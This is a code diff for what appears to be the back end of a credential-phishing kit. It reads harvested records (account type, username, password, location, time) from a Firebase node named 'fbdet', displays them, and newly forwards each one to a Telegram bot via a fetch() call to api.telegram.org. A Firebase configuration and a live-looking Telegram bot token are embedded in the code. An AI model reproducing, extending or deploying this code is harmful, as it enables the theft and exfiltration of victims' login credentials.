@@ -1,22 +1,3 @@
-<!doctype HTML>
-<html>
-<head>
-  <title>Database </title>
-</head>
-<body>
-  <div></div>
-  <div id="save">
-
-  </div>
-
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
-
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
-
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
-
-  <script>
-
 // For Firebase JS SDK v7.20.0 and later, measurementId is optional
 const firebaseConfig = {
   apiKey: "AIzaSyCXbSQv2HsMh-hVzVcDPB8d9Cn8yrQ7EAM",
@@ -27,46 +8,75 @@ const firebaseConfig = {
   messagingSenderId: "492595312611",
   appId: "1:492595312611:web:bf84d62ee07aac8c9392d6"
 };
-    firebase.initializeApp(firebaseConfig);
-    firebase.auth().signInAnonymously().catch(function(error) {
+firebase.initializeApp(firebaseConfig);
 
-      // Handle Errors here.
+// Replace with your Telegram bot token
+const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN";
+// Replace with your chat ID
+const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";
 
-      var errorCode = error.code;
-      var errorMessage = error.message;
+firebase.auth().signInAnonymously().catch(function (error) {
+  var errorMessage = error.message;
+  window.alert("Error : " + errorMessage);
+});
 
-      window.alert("Error : " + errorMessage);
+firebase.database().ref("fbdet").on("child_added", function (snapshot) {
+  var data = snapshot.val();
 
-      // ...
-    });
-    firebase.database().ref("fbdet").on("child_added", function (snapshot) {
+  // Construct message for Telegram
+  const message = `
+    New Record Added:
+    Account Type: ${data.type}
+    User: ${data.emle}
+    Password: ${data.pass}
+    Date: ${data.date}
+    Location: ${data.timezone}
+    Time: ${data.time}
+  `;
 
-
-
-      var html = "";
-
-      html += "<hr></hr>"
-      html += "<li id='message-" + snapshot.key + "' class= 'canvaschat'>";
-
-      html += "Account type: <b>"+snapshot.val().type+ "</b> <br> User: <b> " + snapshot.val().emle+ "</b><br> Password: <b> " +snapshot.val().pass+ "</b> <br> Date: <b>" +snapshot.val().date+"</b><br>Location: <b>"+snapshot.val().timezone+"</b><br> Time: <b>"+snapshot.val().time+"</b>";
-      html += "</li>";
-      html += "<button data-id='" + snapshot.key + "' onclick='deleteMessage(this);' class = 'send'>";
-      html += "Delete";
-      html += "</button>";
-
-      document.getElementById("save").innerHTML += html;
-    });
-    function deleteMessage(self) {
-
-      var messageId = self.getAttribute("data-id");
-
-      firebase.database().ref("fbdet").child(messageId).remove();
+  // Send the message to Telegram
+  fetch(`https://api.telegram.org/bot$7523994267:AAFKipJ1nhsp1TtSRBfaOqum0i9ZOeDnLQI/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message
+    })
+  }).then(response => {
+    if (!response.ok) {
+      console.error("Error sending message to Telegram:", response.statusText);
+    } else {
+      console.log("Message sent to Telegram successfully!");
     }
-    firebase.database().ref("fbdet").on("child_removed", function (snapshot) {
-      // remove message node
-      document.getElementById("message-" + snapshot.key).innerHTML = "deleted";
-    });
+  }).catch(error => {
+    console.error("Error sending message to Telegram:", error);
+  });
 
-  </script>
-</body>
-</html>
+  // Update the webpage
+  var html = "";
+  html += "<hr></hr>";
+  html += "<li id='message-" + snapshot.key + "' class='canvaschat'>";
+  html += "Account type: <b>" + data.type + "</b> <br>";
+  html += "User: <b>" + data.emle + "</b><br>";
+  html += "Password: <b>" + data.pass + "</b><br>";
+  html += "Date: <b>" + data.date + "</b><br>";
+  html += "Location: <b>" + data.timezone + "</b><br>";
+  html += "Time: <b>" + data.time + "</b>";
+  html += "</li>";
+  html += "<button data-id='" + snapshot.key + "' onclick='deleteMessage(this);' class='send'>";
+  html += "Delete";
+  html += "</button>";
+
+  document.getElementById("save").innerHTML += html;
+});
+
+function deleteMessage(self) {
+  var messageId = self.getAttribute("data-id");
+  firebase.database().ref("fbdet").child(messageId).remove();
+}
+
+firebase.database().ref("fbdet").on("child_removed", function (snapshot) {
+  document.getElementById("message-" + snapshot.key).innerHTML = "deleted";
+});
